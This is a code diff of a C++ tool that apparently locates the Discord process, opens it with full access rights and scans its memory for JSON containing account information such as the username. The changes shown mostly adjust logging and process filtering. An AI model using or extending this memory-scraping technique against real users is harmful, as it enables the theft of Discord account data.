@@ -13,7 +13,7 @@ std::wstring GetProcName(DWORD aPid)
     HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
     if (processesSnapshot == INVALID_HANDLE_VALUE)
     {
-        std::wcout << "can't get a process snapshot ";
+        std::wcout << "[+] Can't get a process snapshot ";
         return 0;
     }
 
@@ -26,7 +26,6 @@ std::wstring GetProcName(DWORD aPid)
         }
 
     }
-    std::wcout << "no process with given pid (" << aPid << ")" << std::endl;
     CloseHandle(processesSnapshot);
     return std::wstring();
 }
@@ -86,6 +85,17 @@ void procManager::findProc(uint32_t processID)
         // filter wrong proc
         // parent shares the same memory as all child processes so we want that
         if (parent == L"explorer.exe") {
+            _tprintf(TEXT("[+] Found process: %s (PID: %u) \n"), szProcessName, processID);
+
+
+            // convert TCHAR to string
+            std::string procName(&szProcessName[0], &szProcessName[260]);
+
+            // set values to struct procInfo defined in proc.h
+            procInfo.name = procName;
+            procInfo.pid = processID;
+        }
+        else if (parent.empty()) {
             _tprintf(TEXT("[+] Found process: %s (PID: %u) \n"), szProcessName, processID);
 
 
@@ -197,7 +207,6 @@ discordInformation procManager::scan() {
     // open handle to the right proc
     HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, procInfo.pid);
 
-
     // Get the mimum and maximum address space our JSON could be in
     SYSTEM_INFO info;
 
@@ -281,13 +290,9 @@ discordInformation procManager::scan() {
     account.user.username = username;
 
 
-    /*
-     DEBUG
-    */
-    
+    // execution time end
     std::chrono::steady_clock::time_point end = std::chrono::steady_clock::now();
-    /*
-    std::cout << "[+] Output: " << JSONstring << std::endl;*/
+
     std::cout << "[+] Done in " << (std::chrono::duration_cast<std::chrono::microseconds>(end - begin).count()) / 1000000.0 << "ms" << std::endl;
     
 
